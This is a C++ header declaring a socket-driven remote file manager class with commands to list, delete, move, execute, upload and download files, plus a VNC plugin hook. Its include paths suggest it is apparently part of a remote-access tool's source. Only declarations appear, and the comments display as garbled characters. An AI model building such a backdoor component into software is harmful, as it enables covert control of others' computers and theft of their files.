// FileManager.h: interface for the CFileManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_FILEMANAGER_H__6742600F_C93A_4DD1_9CC4_509B5163833A__INCLUDED_)
#define AFX_FILEMANAGER_H__6742600F_C93A_4DD1_9CC4_509B5163833A__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000


#include <WinSock2.h>
#include <shlwapi.h>
#include "common.h"
#include "..\zxsCommon\CommandLineToArgvA.h"

#pragma pack(push, 8)

typedef struct _MG_FILE_INFO{
    DWORD           dwFileAttributes; 
    FILETIME        ftCreationTime; 
    FILETIME        ftLastAccessTime; 
    FILETIME        ftLastWriteTime; 
    __int64         nFileSize;
    TCHAR           szFileName[MAX_PATH];
} MG_FILE_INFO, *LP_MG_FILE_INFO;

#pragma pack(pop)

#define len_head_FileInfo sizeof(MG_FILE_INFO)-MAX_PATH

typedef int (WINAPI *FindFileCallBack)(int DataType, BYTE *buffer, int datalen, void *lParam);


//Զ���ļ������������
class CFileManager  
{
protected:
	SOCKET Socket;
	__int64 Marker;
	char CurrPath[MAX_PATH];
	char TempBuf[MAX_PATH];
public:
	CFileManager();
	~CFileManager();
public:
	void Init(SOCKET s);
	void SendErr(DWORD errcode);
	int SearchAllFile(char *FileName, bool bRecursion, FindFileCallBack pFunCallback, LPVOID lParam, int callflag);
	int SendFileInfo(char *lpFilePath);
	void SetCurrDir(char *path);
	char *GetCurrDir(){ return CurrPath;}
	BOOL IsWritable(char *LocalFile);
	BOOL CaseCmd(char *CMD, char *Msg);
	BOOL IsAbort();
	int ParseCMD(char *pCmdLine);
	int CMD_LIST(char *szParam);//����Ŀ¼�б�
	int CMD_DELE(char *szParam);//ɾ���ļ���Ŀ¼
	int CMD_MOVE(char *szParam);//�ƶ��ļ���Ŀ¼
	int CMD_RNTO(char *szParam);//�������ļ���Ŀ¼
	int CMD_EXEC(char *szParam);//ִ���ļ�
	int CMD_XMKD(char *szParam);//
	int CMD_REST(char *szParam);
	int CMD_SIZE(char *szParam);
	int CMD_RETR(char *szParam);
	int CMD_STOR(char *szParam);
	int CMD_FILE(char *szParam);//���ָ�����ļ�����Ϣ��Ŀ¼�Ļ�������������е��ļ�
	int CMD_XMD5(char *szParam);
	int CMD_PLUG_vnc(char *szParam);
	int CMD_SEARCH(char *szParam);

	//
};

#endif // !defined(AFX_FILEMANAGER_H__6742600F_C93A_4DD1_9CC4_509B5163833A__INCLUDED_)
